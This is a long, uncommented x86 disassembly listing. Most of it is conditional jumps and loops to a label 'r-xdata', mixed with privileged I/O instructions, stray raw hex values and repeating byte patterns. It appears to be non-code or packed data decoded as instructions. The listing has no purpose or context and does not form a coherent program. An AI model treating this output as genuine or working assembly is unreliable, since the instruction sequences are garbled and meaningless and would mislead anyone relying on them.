jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
mov bl 0x28
sbb eax 0xed1ebfdb
jb r-xdata
imul ebp [ edi - 0x7bc296da ] 0x6b
jb r-xdata
jb r-xdata
xchg al al
mov ch 0xb
sbb eax 0x7272721d
sbb eax 0xad378a1d
jb r-xdata
0xc80be2e2 0x1d2a
jb r-xdata
cmpsd [ esi ] [ edi ]
mov dl 0x6f
jb r-xdata
jb r-xdata
loop r-xdata
mul dl
jb r-xdata
mov esp 0x7272212b
shl [ edx ] 0x1
popad
sbb bl [ 0xb2377ed ]
iretd
mov dl 0x1d
mov ah 0x86
shr [ ebx ] 0x1
mov ecx 0xeabf6b84
mov ecx 0xe6bf6b84
mov ah dl
mov ecx 0xe4bf6b84
mov dh dl
jb r-xdata
mov ebp 0x212bb9bc
jb r-xdata
jb r-xdata
imul esp [ edi - 0x58947bd4 ] 0x32
jb r-xdata
or eax [ ecx + 0x721d1d1e ]
mov bl 0xa
jpo r-xdata
imul ah
mov cl 0x1d
xchg esi eax
loop r-xdata
jb r-xdata
imul esp [ esi + ebx * 8 - 0x1d1c8cf6 ] 0xffffffe2
imul esp [ edx + ecx - 0x1e ] 0xffffffe2
loop r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
and cl [ ebx ]
mov cl 0xff
loop r-xdata
jb r-xdata
out 0xe2 eax
loop r-xdata
jb r-xdata
int1
jb r-xdata
loop r-xdata
loop r-xdata
sbb eax 0xd0b066ed
je r-xdata
or ah [ edi ]
jb r-xdata
scasd [ edi ]
jb r-xdata
adc ah [ edi + 0x14 ]
in eax dx
sub [ esi ] dx
sbb eax 0xf2a7691d
imul edi edx 0xffffffb1
mov ah 0xb
mov ah 0xb
sbb eax 0x1d67721d
mov al al
loop r-xdata
jb r-xdata
jb r-xdata
imul ebx [ esp + eax * 4 ] 0xb189f6b
cli
mov bl 0x88
jecxz r-xdata
jb r-xdata
or esp [ ebx + 0x10 ]
loop r-xdata
cmpsd [ esi ] [ edi ]
outsd
jb r-xdata
loop r-xdata
sbb eax 0xb772721d
or edi esi
pop ss
sbb eax 0x7272721d
jb r-xdata
sbb eax 0xbb77272
jb r-xdata
jecxz r-xdata
loop r-xdata
popad
test [ ebx - 0x59 ] ch
jb r-xdata
add ebx [ 0xfffffffff6280b1d ]
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
adc [ 0xb72721d ] bl
sbb eax 0x26551d1d
jb r-xdata
add eax 0x551d1d1d
jb r-xdata
jb r-xdata
jb r-xdata
push eax
test [ ebx - 0x41 ] ch
jb r-xdata
jb r-xdata
fsubrp st0
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
xchg edi eax
push es
imul esp [ 0x1d009b0a ] 0x22d1bb1d
or ebp [ ebx ]
in al dx
loop r-xdata
loop r-xdata
loop r-xdata
inc edx
sub al 0x1d
sbb eax 0xdfee2661
or [ eax ] 0xe2
jb r-xdata
and al 0x88
mov ecx [ ebx ]
loop r-xdata
scasd [ edi ]
loop r-xdata
jb r-xdata
jb r-xdata
mov dh [ edi ]
lodsd [ esi ]
sbb eax 0x72727272
mov bh 0x69
push cs
or ecx [ edx + ecx + 0x1d ]
loop r-xdata
jb r-xdata
jb r-xdata
push esp
test [ ebx - 0x59 ] ch
mov [ ebx + ebp * 2 + 0x6f0b06b7 ] es
jb r-xdata
mov ecx 0x7272212b
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
or ah dl
jb r-xdata
cmp [ esi ] eax
cmp [ ebp + 0x6ced1467 ] esi
adc ah dl
loop r-xdata
jb r-xdata
out 0x1d al
cmpsb [ esi ] [ edi ]
mov cl 0xb4
imul edx [ edx + 0x5e ] 0xd1e2e2e2
jb r-xdata
mov edx 0x69e2e2ec
mov ah 0x96
loop r-xdata
loop r-xdata
add dh ah
loop r-xdata
shl dl 0xe2
jb r-xdata
loop r-xdata
jb r-xdata
in eax dx
mov al 0xd0
or ebx [ 0x1d67721d ]
outsd
xor bl [ bx ]
imul esp ebx 0xffffffb1
or esi [ ecx + 0x1d ]
jb r-xdata
jb r-xdata
shl eax 0xe2
loop r-xdata
push ds
jb r-xdata
sbb [ 0xffffffffa66bbb1d ] bl
nop
jb r-xdata
inc esi
jb r-xdata
outsd
jb r-xdata
loop r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
out 0xaa al
jb r-xdata
sbb eax 0xe2f6280b
loop r-xdata
imul ebx [ esi + 0x14d1066f ] 0x280b2c69
sbb eax 0x72727272
jb r-xdata
jb r-xdata
shl [ edx ] 0x1
sbb eax 0xe2e22655
jb r-xdata
sbb eax 0xe226551d
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
mov edi 0xbb3a6952
jb r-xdata
jb r-xdata
or ecx edi
or bl [ 0x741db21d ]
dec esi
jb r-xdata
xchg edi eax
sbb al 0x84
jb r-xdata
sbb eax 0xed72721d
and al 0xa
jb r-xdata
loop r-xdata
in eax dx
jb r-xdata
imul esp [ edi + 0x35520b1a ] 0x1d
sbb eax 0x72727272
imul edi [ edx ] 0xbf6b84bb
cmp eax 0x52bf6b84
jb r-xdata
jb r-xdata
or esp [ edx ]
sbb eax 0x6971db2
jb r-xdata
mov edi 0x843c69ea
imul edi [ edi + 0x1ac60be8 ] 0x1d
jb r-xdata
jb r-xdata
imul esp [ edi - 0x7bdf96ce ] 0x6b
jb r-xdata
sbb eax 0xbc6f721d
jb r-xdata
and [ edx + 0x72 ] esi
jb r-xdata
jb r-xdata
or edi [ 0x721d1d04 ]
loop r-xdata
jb r-xdata
jb r-xdata
in eax dx
pushad
adc eax 0x55ed1d1d
jb r-xdata
jb r-xdata
and ch ch
out 0xe2 al
loop r-xdata
loop r-xdata
imul esp [ esi + ebx * 4 + 0x1d1cfa0a ] 0x1d
mov ch [ ebp - 0x4a1063e7 ]
imul esp [ esi + ecx * 8 + 0x1d1ce80a ] 0x1d
mov al [ edx ]
ffreep st3
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
fwait
jb r-xdata
jb r-xdata
mov dl ah
sbb eax 0x1df6c696
aam 0x1d
jb r-xdata
loop r-xdata
jb r-xdata
mov [ 0x1d14130b ] al
sbb eax 0x2361b172
adc cl [ edx ]
imul ecx [ eax ] 0xa1691d1d
salc
stosb [ edi ]
loopne r-xdata
jb r-xdata
outsd
jb r-xdata
imul esp [ ebx + ecx ] 0x1d1d1c50
jb r-xdata
jb r-xdata
jb r-xdata
imul esi [ edi - 0x2ecd967c ] 0x22
jb r-xdata
test [ ebx - 0x59 ] ch
test [ ebx - 0x49 ] ch
jb r-xdata
jb r-xdata
mov dl 0x88
cld
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
or eax [ eax ]
hlt
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
or esp [ edi + 0x721d1d10 ]
push ebp
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
or al [ edx + 0x2c ]
sbb eax 0xee26611d
fild [ edx - 0x121d1df8 ]
loop r-xdata
mov bh 0xb
add bl [ 0xffffffffb21d881d ]
or ebp [ ebx ]
loop r-xdata
imul ebx [ edi + 0xb1a6914 ] 0x2b
jb r-xdata
mov al ah
or ebx ebp
adc eax 0x72721d1d
sbb eax 0x109f6b84
imul ebx [ ebx ] 0x169f6b84
jb r-xdata
sbb eax 0x971db21d
mov bl 0x28
jb r-xdata
imul edi [ edi - 0x44c596ae ] 0xffffff84
jb r-xdata
jb r-xdata
mov cl 0xb
pop edi
xor [ 0x1a61721d ] ebx
jecxz r-xdata
sbb eax 0xa70b0697
jb r-xdata
jb r-xdata
jb r-xdata
imul edi [ esp + eax * 4 ] 0xbe8bf6b
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
mov bh 0x69
jb r-xdata
or [ ebx ] bl
sbb eax 0x7272721d
loop r-xdata
jb r-xdata
or ebp [ edi + 0x72e2e2f1 ]
jb r-xdata
sbb eax 0x6f56af6f
loop r-xdata
imul esp [ edx + ecx * 8 + 0x1d1f090a ] 0x1d
mov dh [ ecx - 0x4aef1484 ]
imul esp [ esi + eax * 8 + 0x1d1f3f0a ] 0x1d
mov ah [ edi - 0x4aadb82e ]
imul esp [ esi + ebp * 8 + 0x1d1f2d0a ] 0x1d
or edx [ edi - 0x39 ]
sbb eax 0xcf418a1d
add ebp edi
mov ch 0x6b
movsb [ edi ] [ esi ]
0x90a
sbb ebx [ edi ]
aam 0xb5
imul esp [ edx + ebx * 2 - 0x1e ] 0xffffffe2
loop r-xdata
sahf
jb r-xdata
sbb al 0x1d
sbb eax 0xa9ea46b
cli
jb r-xdata
imul edi [ edi - 0x1381f436 ] 0xffffffe2
jb r-xdata
jb r-xdata
mov dl 0x84
imul esi [ edi - 0x50947bfc ] 0x12
or ecx [ ebx + 0x72e2e2eb ]
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
sbb cl [ ebx ]
fsubr st2
loop r-xdata
sbb eax 0x16751dd4
and ah bh
mov [ ebx ] ebp
out 0x58 eax
sbb eax 0x84e2e2f7
imul esi esi 0xffffffd3
imul edx [ esi - 0x59db112e ] 0xffffffd2
and ecx edx
and dh [ edx - 0x4e4d4d4e ]
lodsb [ esi ]
in al dx
loop r-xdata
jb r-xdata
or edx [ eax + 0x1c ]
jb r-xdata
shl [ edx ] 0x1
imul esi [ edi - 0x7f77477e ] 0xffffff84
jb r-xdata
sbb eax 0xbb51297
xchg esp eax
in al 0xe2
jb r-xdata
test [ ecx + 0x32 ] ch
jb r-xdata
xchg edx eax
mov bh 0x84
jb r-xdata
mov ecx 0x7272212b
jb r-xdata
outsd
adc [ 0x7272721d ] ebx
jb r-xdata
and ah [ ecx ]
jb r-xdata
loop r-xdata
jb r-xdata
sbb eax 0x1d3b680b
sbb ebx ebp
or esi [ ebp + 0x72e2e2f2 ]
jb r-xdata
loop r-xdata
jb r-xdata
loop r-xdata
sbb eax 0xf6280b1d
jb r-xdata
and [ edx + 0x72 ] esi
bound ebp [ eax ]
sbb eax 0x2267bb1d
in eax dx
mov [ 0x1d3c ] al
sbb eax 0xb2bea76f
or eax ebp
cmp al 0x1d
sbb eax 0x72727272
jb r-xdata
mov cl 0xb1
jb r-xdata
test [ ebx - 0x51 ] ch
mov ebx 0x50bf6b84
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
sbb cl [ ebx ]
adc al 0x69
jb r-xdata
imul ebx [ esp + eax * 4 ] 0x69149f6b
imul ebx [ edi - 0x7be496f0 ] 0x6b
lahf
jb r-xdata
jb r-xdata
push edx
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x22d1721d
jb r-xdata
jb r-xdata
sbb eax 0x72727272
jb r-xdata
test [ ebx - 0x41 ] ch
call 0x1d60883c
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
push cs
jb r-xdata
loop r-xdata
jb r-xdata
int1
jb r-xdata
mov cl 0xb4
mov ebp 0x72212bb9
jb r-xdata
shl [ edx ] 0x1
movsb [ edi ] [ esi ]
jb r-xdata
mov ebx 0xbe0b2267
adc edx [ ebx + 0x61b1721d ]
and edx [ edx ]
or ch [ ecx + 0x8 ]
sbb eax 0xd6a1691d
outsd
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
or ebx [ ebx + 0x721d1d00 ]
jb r-xdata
or al [ edx ]
jb r-xdata
jb r-xdata
cmp [ eax + 0x6b848088 ] 0xb7
jb r-xdata
sbb eax 0xa7698ab4
shl [ edx ] 0x1
loop r-xdata
cmpsd [ esi ] [ edi ]
push ds
fldenv [ ecx ]
or esp esp
test [ ebx + ebp * 2 - 0x68967569 ] 0x9e
xor dl cl
jb r-xdata
imul esi [ edx ] 0x6b8422d1
jb r-xdata
sbb eax 0x4180b1d
sbb eax 0xa725721d
call 0x6f62e593
outsd
sub bl [ edi ]
imul ebx [ ebx ] 0x209f6b84
imul ebx [ esp + eax * 4 ] 0x88269f6b
mov ah 0xb
push ebx
sbb eax 0x7272721d
mov bh 0x69
push cs
mov bl 0xb
sub [ ebx ] ecx
mov esp 0x72212bb9
jb r-xdata
push cs
pop ds
sbb eax 0x800bb21d
int1
loop r-xdata
sbb eax 0x6f727272
jb r-xdata
mov ah bh
jb r-xdata
jb r-xdata
jb r-xdata
test [ ebx - 0x61 ] ch
jb r-xdata
or dl ah
mov dl 0xb1
jb r-xdata
sahf
outsd
push es
rcl [ ecx + ebp * 2 ] 0x1
sub al 0xb
sub al dh
loop r-xdata
jb r-xdata
jb r-xdata
or esi [ esp + edi + 0x1d ]
sbb eax 0x72727272
xchg [ 0x7c0beab5 ] bl
mov dl al
shl [ edx ] 0x1
mov dh dh
test [ ebx - 0x59 ] ch
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
popad
out dx al
sub ebp ebp
jb r-xdata
push ss
adc [ ecx + 0x1b ] ch
test [ ebx - 0x61 ] ch
jb r-xdata
mov dl 0x1d
jb r-xdata
cmp bh [ ebx + 0x50bf6b84 ]
jb r-xdata
jb r-xdata
sub [ 0xffffffffb5b5b51d ] bl
cmpsd [ esi ] [ edi ]
jb r-xdata
jb r-xdata
enter 0x1d24 0x1d
popad
mov edi 0x1ac60be8
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
or ebx [ ecx + edx * 8 + 0x7272e2e2 ]
jb r-xdata
in eax dx
jb r-xdata
sbb eax 0x72721d1d
jb r-xdata
jb r-xdata
test [ ebx - 0x41 ] ch
loop r-xdata
jb r-xdata
jb r-xdata
or bh dl
mov ebx 0xba222d1
jb r-xdata
jb r-xdata
jl r-xdata
jb r-xdata
jb r-xdata
outsd
add [ 0x7272721d ] bl
jb r-xdata
hlt
jb r-xdata
sbb eax 0xe2887272
jb r-xdata
mov [ ebx + ebp * 2 + 0x326984b7 ] es
mov [ eax - 0x7f48947c ] al
jb r-xdata
call sub_45e591
sbb eax 0x1f2a6f6f
jb r-xdata
jb r-xdata
jb r-xdata
and al [ ebx + ebp * 2 - 0x58906d59 ]
jb r-xdata
jb r-xdata
out 0xe2 al
jb r-xdata
loop r-xdata
out dx al
fldenv [ ecx ]
sub ah al
mov dl 0x6f
jb r-xdata
or edi [ edi + 0x72e2e2f8 ]
sahf
adc ch ch
pushad
hlt
sbb eax 0x72727272
in eax dx
cmp [ eax - 0x7948947c ] 0x88
test [ eax - 0x7358947c ] edi
jb r-xdata
jb r-xdata
sbb eax 0x530b0697
jb r-xdata
jb r-xdata
sbb eax 0x1dd1eab4
or ebp [ 0x721d1d0e ]
jb r-xdata
mov [ esp + eax * 4 - 0x45c95895 ] cl
mov [ esi + 0x34a76b84 ] dl
shl [ edx ] 0x1
or edi [ esi ]
cmp [ 0x7272721d ] bl
jl r-xdata
mov dl 0x69
and al 0xa
cli
mov cl 0xb1
mov cl 0xb1
outsd
loop r-xdata
loopne r-xdata
sbb eax 0x7c0beab5
jb r-xdata
jb r-xdata
jb r-xdata
mov dl 0x88
jb r-xdata
jb r-xdata
sbb eax 0x180f0b1d
or ecx [ esi + 0x37 ]
sbb eax 0x3b69721d
mov [ ecx + 0x4ebf6b84 ] al
mov ecx 0x4cbf6b84
mov [ ecx + 0x5caf6b84 ] dl
mov ebx 0x6b849688
scasd [ edi ]
and [ ebx + 0x6b849788 ] bh
sub eax [ edx ]
loop r-xdata
jb r-xdata
sbb eax [ ebx + ebp * 2 + 0x1c69169f ]
jb r-xdata
xchg edi eax
jb r-xdata
test [ ebx - 0x41 ] ch
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
mov dl 0x69
cmpsd [ esi ] [ edi ]
sbb ch [ ecx + 0x62 ]
inc esi
loop r-xdata
jb r-xdata
and bh [ ebx + ebp + 0x72727221 ]
jb r-xdata
jb r-xdata
or eax esi
jb r-xdata
jb r-xdata
shl edx 0x1
jb r-xdata
jb r-xdata
jb r-xdata
xchg edi eax
jb r-xdata
jb r-xdata
jb r-xdata
0x7e0b
jb r-xdata
jb r-xdata
adc [ ebp + 0xac6a46b ] dh
aas
pop ds
sbb eax 0xd2a78a1d
inc edi
or bh [ edx ]
pop ds
test [ ebx - 0x49 ] ch
add al 0x84
imul ebp [ edi - 0x1474f4ee ] 0xffffffe2
xchg ebp eax
test [ ebx - 0x59 ] ch
push es
jbe r-xdata
sbb eax 0xed727272
jb r-xdata
sbb eax 0xb2727272
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
test [ ebx - 0x49 ] ch
jb r-xdata
mov ch [ ecx - 0x59 ]
sbb eax [ ebx + ebp * 2 + 0x1c69209f ]
imul ebx [ ebx ] 0xede31d61
jb r-xdata
popad
jb r-xdata
imul esp [ edi - 0x958906e ] 0xffffff84
imul edx [ edi - 0x61689676 ] 0xb
mov edi 0x72e2e2f8
jb r-xdata
jb r-xdata
mov edx 0x25b48c87
cmpsd [ esi ] [ edi ]
pop edx
scasd [ edi ]
scasd [ edi ]
mov edx 0x5ea72587
mov dl 0x1d
loop r-xdata
jb r-xdata
loop r-xdata
leave
jb r-xdata
sbb eax 0x2fd90b1d
sbb eax 0x7272721d
or esi ebp
out 0xe2 al
loop r-xdata
imul ecx [ esi ] 0xb290bb3
xchg [ eax + 0x6b84b885 ] cl
cmpsd [ esi ] [ edi ]
test [ ebx - 0x49 ] ch
or bh [ edi + 0x3 ]
or edx [ ebx ]
xor [ 0x7272721d ] bl
jb r-xdata
jb r-xdata
jb r-xdata
mov cl 0x88
retn 0xb1b1
loop r-xdata
loop r-xdata
or dl ah
jb r-xdata
0xe2e07c0b 0x72e2
jb r-xdata
imul ebp [ edi + 0xb8b8824 ] 0xffffffe2
stc
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
fst [ 0x72721d1d ]
loopne r-xdata
jb r-xdata
or esi [ esi ]
clc
loop r-xdata
jb r-xdata
mov edi 0xe0050a12
loop r-xdata
cmc
loop r-xdata
and ch ch
0x88e2e2e2 0x1de2
sbb eax 0xb21d881d
jb r-xdata
imul ebx [ edi - 0x7be396ea ] 0x6b
lahf
jb r-xdata
jb r-xdata
mov edi 0xaf6b8450
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
sbb bl [ 0x7272721d ]
sbb eax 0x37220baa
test [ ebx - 0x49 ] ch
mov eax 0x1d044d0b
loop r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
inc esi
or eax [ ebp + 0x1c ]
sbb eax 0x7272721d
in eax dx
sbb eax 0x56af6f1d
outsd
jb r-xdata
jb r-xdata
imul esp [ edx + ecx ] 0x1d1d1f3a
mov ebx 0x66ed2267
jmp r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
xchg edi eax
jb r-xdata
push edx
mov ch 0x6b
outsd
cmpsb [ esi ] [ edi ]
xor ch ch
push ebp
or ecx [ ecx + 0x721d1d09 ]
jb r-xdata
loop r-xdata
popad
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
and ch ch
jb r-xdata
mov eax 0x86b76b84
mov bh 0x80
jb r-xdata
jb r-xdata
fistp [ edi - 0x598120a ]
loop r-xdata
cli
loop r-xdata
popad
jb r-xdata
mov [ es : ebx + ecx + 0x1d1d3653 ] dh
lahf
loop r-xdata
xchg edi eax
adc dh [ ebp - 0x1d1b6bf5 ]
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
sbb eax 0x1d04180b
sbb eax 0x56a72572
mov ecx 0xe2e067ed
jb r-xdata
sbb eax 0xb72721d
jb r-xdata
sbb eax 0x9367ede3
jb r-xdata
jb r-xdata
jb r-xdata
test [ ebx - 0x41 ] ch
sbb ch [ ecx + 0x3c ]
test [ ebx - 0x41 ] ch
sbb [ ecx + 0x3a ] ch
or ebp ebp
inc edx
pop ds
sbb eax 0xb51db21d
mov dl 0xb1
sbb eax 0xe2e24e75
loop r-xdata
mov cl 0xb1
mov cl 0x6f
jb r-xdata
imul esp [ ebx + ecx ] 0x1d1d231e
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
in eax dx
jb r-xdata
test [ ebx - 0x61 ] ch
loop r-xdata
sub ebp ebp
jb r-xdata
loop r-xdata
sbb eax 0x4e741db2
jb r-xdata
jb r-xdata
sbb eax 0xed22671d
cdq
and [ 0x180f0b1d ] ebx
push edi
xor bl [ edi ]
mov [ 0xbe088b2 ] bl
outsd
jb r-xdata
jb r-xdata
jb r-xdata
and [ 0x22d1721d ] ebx
or cl al
and al 0x1d
sbb eax 0xbee2661
jb r-xdata
jb r-xdata
movsb [ edi ] [ esi ]
into
or ch al
sbb al 0x1d
sbb eax 0xc3df028a
sbb eax 0x6b0aea97
add [ 0xbbbbb1d ] ebx
jb r-xdata
jb r-xdata
jb r-xdata
or ch [ ebx + 0x1 ]
sbb eax 0xbbbbb1d
pop ebp
shl [ edx ] 0x1
or eax [ eax + 0x721d1d1d ]
jb r-xdata
or eax [ ecx + ecx * 8 - 0x1e ]
loop r-xdata
mov dl 0xb2
mov dl 0xb1
jb r-xdata
jb r-xdata
mov edx 0xe2f8900b
loop r-xdata
mov [ ebp + 0x6a76b84 ] dl
jb r-xdata
loop r-xdata
jb r-xdata
sbb eax 0x2bd186b4
loop r-xdata
jecxz r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
outsd
jb r-xdata
popad
cdq
adc eax 0x7272213a
jb r-xdata
mov ah 0xea
popad
sbb bl [ 0x692377ed ]
mov dl 0x1d
mov ah 0x86
shr [ ebx ] 0x1
loop r-xdata
in eax dx
xchg ebx eax
in eax dx
mov [ edx + 0x1d05950b ] ah
jg r-xdata
and ebp [ ecx + 0x1b ]
jb r-xdata
loop r-xdata
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
sbb eax 0x32676f1d
pop ds
sbb eax 0x1db1b21d
mov ch 0xf6
imul edx [ edi + 0x32 ] 0x1f
out 0x19 al
in eax dx
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
test [ ebx - 0x49 ] ch
push es
mov eax 0x1d0fe50b
sbb eax 0x72727272
jb r-xdata
jb r-xdata
0x1d016b0a 0xbb1d
jb r-xdata
mov edi 0xec7e0bca
jb r-xdata
cmpsd [ esi ] [ edi ]
push cs
mov dl 0xb
mov esp ebp
loop r-xdata
sbb eax 0x9c19ad8a
out dx eax
mov ch 0x6b
add bl [ 0xffffffff9ea46b1d ]
jb r-xdata
sbb [ 0xfffffffffd9267ed ] ebx
loop r-xdata
push es
sbb eax 0xee26611d
imul ebx [ esi + 0xab4f6c6 ] 0xffffff90
mov bl [ 0xffffffffb1e2e2e2 ]
mov ah 0xa
daa
push ds
jb r-xdata
push esi
loop r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
sub bl [ bx ]
sbb eax 0x950bbb72
cmp al 0x1d
sbb eax 0xd6941d72
or esp [ esi - 0x10 ]
mov [ 0x1d05950b ] al
test [ ebx - 0x69 ] ch
mov ch [ ecx - 0x69 ]
in eax dx
jb r-xdata
jb r-xdata
jb r-xdata
sub ebx [ 0x3b680b1d ]
sbb eax 0x7272721d
or ebp [ esi + 0x13 ]
sbb eax 0x7272721d
sub dh dh
sbb esp [ ecx + 0x1d ]
sbb eax 0x7272721d
jb r-xdata
loop r-xdata
loop r-xdata
and al 0xb
push ds
and ebx [ 0x7272721d ]
jb r-xdata
aaa
jb r-xdata
jb r-xdata
sbb eax 0xa90bb694
add al 0x1d
jb r-xdata
jb r-xdata
in eax dx
jb r-xdata
jb r-xdata
jb r-xdata
out 0x19 al
jb r-xdata
jb r-xdata
sbb eax 0x370bb41d
jb r-xdata
jb r-xdata
or ch [ 0xb1d1d1f ]
dec edx
and edx 0xffffffe2
and eax 0x7afac6a6
fsub st2
loop r-xdata
or edi [ esi - 0x14 ]
jb r-xdata
jb r-xdata
mov dl ah
sbb eax 0xe2e26274
sbb eax 0xb41db21d
xchg [ ecx + 0x2a ] ah
loopne r-xdata
pop ds
mov [ 0xffffffffb166ede2 ] al
pop ds
sbb eax 0x8ae2881d
adc edi edi
mov esp [ edx - 0x1d0523f5 ]
loop r-xdata
sbb eax 0x9961eab4
jb r-xdata
sub bl [ bx ]
sbb eax 0xb41db21d
outsd
push ebp
test [ ebx - 0xe ] ch
test [ edi + 0x30 ] ah
in eax dx
pop ds
jb r-xdata
jb r-xdata
pop es
sbb eax 0x7272721d
jb r-xdata
or ebp [ esi ]
or ebx [ 0x7272721d ]
mov [ ebx - 0x40947b47 ] cl
push ss
imul edi [ 0x14bf6b84 ] 0x6b843a69
mov edi 0x843c691a
imul edi [ edi + 0xb3a6918 ] 0xffffffed
jb r-xdata
jb r-xdata
push ebp
not [ ebx + 0x1d21940b ]
sbb eax 0x72727272
jb r-xdata
jb r-xdata
sbb eax 0xa7611aa7
jb r-xdata
jb r-xdata
and ch ch
dec bx
jb r-xdata
loop r-xdata
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
xchg edi eax
push ss
or esp ebp
or eax 0x72721d1d
sbb al [ ebx + ebp * 2 - 0x5890f351 ]
and dl cl
sub esi [ ebx + ecx + 0x1d1d3c74 ]
jb r-xdata
and cl [ eax - 0x58947b0a ]
lodsb [ esi ]
cli
loop r-xdata
jb r-xdata
jb r-xdata
in al dx
jb r-xdata
sbb eax 0x2267bb1d
in eax dx
jmp r-xdata
and al 0xa
cmp bl [ edi ]
imul edx [ edi + 0x6ae468ea ] 0x30d1dbe6
imul esp [ ebx ] 0x1d5fa80b
sbb eax 0x35840a72
sbb eax 0x2267bb1d
in eax dx
jb r-xdata
mov ebp 0x6b84a088
lahf
push edx
mov ebp 0x509f6b84
sbb eax 0x1d3fe30b
sbb eax 0xd1727272
sbb eax 0x1e9f6b84
jb r-xdata
jb r-xdata
imul ebx [ edx ] 0xe2e3e68a
loop r-xdata
push ds
0xbbbb
push ebp
movsb [ edi ] [ esi ]
in al 0x1d
add ah dh
loop r-xdata
popad
cmpsd [ esi ] [ edi ]
jb r-xdata
jb r-xdata
sbb ah [ ecx - 0x59 ]
in eax dx
jb r-xdata
jb r-xdata
mov esp 0x3ca50aaa
sbb eax 0xd6a46b1d
jb r-xdata
loopne r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
sbb ecx [ edx + 0x205260ed ]
jecxz r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
outsb
adc ebx [ 0x7272721d ]
pop sp
imul esi edx 0xffffff84
xor ch ch
jb r-xdata
jb r-xdata
call 0xffffffffa70fa9c3
aaa
jb r-xdata
loop r-xdata
imul edi [ edx + ebp * 4 + 0x1d3ca50a ] 0x1d
imul esp [ esi + edx * 8 - 0x7cbbbf76 ] 0x9
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
mov [ esp + eax * 4 + 0xb06b76b ] cl
outsd
jb r-xdata
jb r-xdata
jb r-xdata
imul esp [ esi + edi * 8 + 0x1d35380a ] 0x1d
mov ch [ edi ]
jb r-xdata
sbb eax 0xb20ea76f
imul esp [ edx + ecx ] 0x1d1d35b0
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
rcr [ 0x1e9f6b84 ] 0x1
mov bh ch
or bl [ eax + 0x611d1d5d ]
out dx al
jb r-xdata
sbb cl [ edx - 0x1d1d1c1a ]
jb r-xdata
jb r-xdata
jb r-xdata
leave
jb r-xdata
jb r-xdata
in eax dx
movsb [ edi ] fs : [ esi ]
mov ch 0x6b
movsb [ edi ] [ esi ]
retn 0xea0b
loopne r-xdata
dec [ edx ]
cmp [ 0x2f8a1d1d ] dh
jb r-xdata
sbb eax 0xe2e8130b
loop r-xdata
mov ch [ ebx - 0x4a83ce97 ]
imul esp [ edx + esi * 8 + 0x1d3ae50a ] 0x1d
mov dl 0x69
and al 0xa
mov al 0x35
sbb eax 0xd0bbb1d
cmpsd [ esi ] [ edi ]
jb r-xdata
jb r-xdata
loop r-xdata
sub esp [ ecx ]
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
salc
loop r-xdata
push ds
or esi [ ecx + 0x72e2e2e7 ]
cmpsd [ esi ] [ edi ]
or bh [ edx + 0x6b848c88 ]
scasd [ edi ]
out dx al
sbb eax 0x40b96b5
in al dx
jb r-xdata
jb r-xdata
imul esp [ edi - 0x184ef500 ] 0xffffffe2
loop r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
push ds
sub esp [ ecx ]
jb r-xdata
pop esi
loop r-xdata
xchg edi eax
out dx al
in eax dx
jb r-xdata
jb r-xdata
cmpsb [ esi ] [ edi ]
jb r-xdata
jb r-xdata
jb r-xdata
cli
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
xchg esi eax
jb r-xdata
jb r-xdata
or ecx [ 0x72e2e2f0 ]
jb r-xdata
jb r-xdata
sub ecx [ bp + di ]
outsb
jb r-xdata
sbb eax 0xe2e24272
loop r-xdata
or esp [ esi - 0x3ce2e2ee ]
mov esi 0xfd0bf2c6
sbb eax 0x7272721d
sub esp [ edi + 0x22 ]
in eax dx
jb r-xdata
and [ edx + 0x72 ] esi
stosb [ edi ]
loop r-xdata
jb r-xdata
dec ebp
or dh [ 0xffffffffee8a1d1d ]
jb r-xdata
jb r-xdata
jb r-xdata
mov ch 0xb2
jb r-xdata
or ecx [ edi + 0x721d1d0d ]
jb r-xdata
lahf
jecxz r-xdata
push es
outsd
sbb eax 0x3fe30b1d
jb r-xdata
jb r-xdata
jecxz r-xdata
loop r-xdata
or esp esp
add bl [ 0x7272721d ]
jb r-xdata
jb r-xdata
jb r-xdata
and [ ebx - 0x4b ] edx
sbb eax 0x4dee8a1d
jb r-xdata
adc dh [ edx + 0x1a340bb5 ]
jb r-xdata
sbb eax 0xe2e26e74
sub esp [ es : ecx ]
jb r-xdata
mov ebp 0xe2f2770b
